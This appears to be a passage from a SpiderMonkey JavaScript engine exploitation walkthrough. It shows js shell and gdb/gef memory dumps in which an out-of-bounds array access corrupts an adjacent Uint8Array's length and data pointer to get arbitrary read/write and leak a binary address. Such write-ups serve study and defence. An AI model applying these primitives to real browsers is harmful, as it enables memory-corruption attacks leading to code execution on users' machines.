js> a = new Array(1, 2, 3, 4, 5, 6)
js> b = new Uint8Array(8)
js> objectAddress(a)
"0x328c9bc01590"
js> objectAddress(b)  
"0x328c9bc015f0"

gef➤  x/30xg 0x328c9bc01590
0x328c9bc01590:	0x000021a56fdc1160	0x000021a56fda0b68	# <-- start of a
0x328c9bc015a0:	0x0000000000000000	0x0000328c9bc015c0
0x328c9bc015b0:	0x000001a400000000	0x000001a4000001a4
0x328c9bc015c0:	0xfff8800000000001	0xfff8800000000002	# <-- inline buffer at 0x30
0x328c9bc015d0:	0xfff8800000000003	0xfff8800000000004
0x328c9bc015e0:	0xfff8800000000005	0xfff8800000000006
0x328c9bc015f0:	0x000021a56fdc1190	0x000021a56fdbab28	# <-- start of b
0x328c9bc01600:	0x0000000000000000	0x0000555557b0be08	# <-- pointer to emptyElementsHeader+16
0x328c9bc01610:	0xfffa000000000000	0xfff8800000000008	# <-- capacity of b (+8)
0x328c9bc01620:	0xfff8800000000000	0x0000328c9bc01630	# <-- DATA_SLOT (+8)
0x328c9bc01630:	0x0000000000000000	0xfffe2d2d2d2d2d2d
0x328c9bc01640:	0xfffe2d2d2d2d2d2d	0xfffe2d2d2d2d2d2d
0x328c9bc01650:	0x00007ffff5c45000	0x0000000e00000252
0x328c9bc01660:	0x6239633832337830	0xff00303935313063
0x328c9bc01670:	0xfffe2d2d2d2d2d2d	0x00007ffff5c45000

gef➤  pi (0x328c9bc01618 - 0x328c9bc015c0) / 8			# <-- distance between a[0] and capacity of b
11.0
gef➤  c
Continuing.
js> a[11] 
8
js> b.length
8
js> a[11] = 123							# <-- arbitrary write!
123
js> b.length
123
js> new Int64('0xcafebabedeadbeef').asDouble()         
-1.8395618485427472e+53
js> a[13] = new Int64('0xcafebabedeadbeef').asDouble()
-1.8395618485427472e+53
gef➤  x/8 0x328c9bc015f0
0x328c9bc015f0:	0x000021a56fdc1190	0x000021a56fdbab28
0x328c9bc01600:	0x0000000000000000	0x0000555557b0be08
0x328c9bc01610:	0xfffa000000000000	0xfff880000000007b
0x328c9bc01620:	0xfff8800000000000	0xcafebabedeadbeef	# <-- ta dah!!!

gef➤  x 0x0000555557b0be08
0x555557b0be08 <_ZL19emptyElementsHeader+16>:	0xfff9800000000000
gef➤  xinfo 0x0000555557b0be08
─────────────────────────────────────────── xinfo: 0x555557b0be08 ───────────────────────────────────────────
Page: 0x0000555555554000  →  0x0000555558cf7000 (size=0x37a3000)
Permissions: r-x
Pathname: /usr/workdir/gecko-dev/js/src/build.assets/dist/bin/js
Offset (from page): 0x25b7e08
Inode: 306761
Segment: .rodata (0x0000555557982b90-0x000055555868b83a)			# <-- this thing lives in .rodata
Symbol: emptyElementsHeader+16

js> a[9]  
4.6355724923398e-310
js> Int64.fromDouble(a[9]).toString(16)						# <-- arbitrary read! leaked emptyElementsHeader+16
"0x0000555557b0be08"


